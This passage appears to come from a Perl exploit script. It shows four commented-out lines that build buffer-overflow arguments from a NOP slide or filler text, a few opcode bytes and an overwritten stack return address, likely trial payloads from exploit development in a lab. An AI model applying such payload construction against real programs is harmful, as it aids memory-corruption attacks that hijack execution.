...
#my $arg = $nopslide."\xfe\xeb\x80\xcd"."\x50\xdc\xff\xff\xff\x74";
#my $arg = $nopslide."\xfe\xeb\x80\xcd"."\x20\xdc\xff\xff\xff\x74";
#my $arg = "123456789"."\xfe\xeb\x80\xcd"."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuwvxyz"."\x20\xdc\xff\xff\xff\x74";
#my $arg = "123456789"."\xfe\xeb\x80\xcd"."ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuwvxyz"."\x20\xdc\xff\xff\xff\x74";
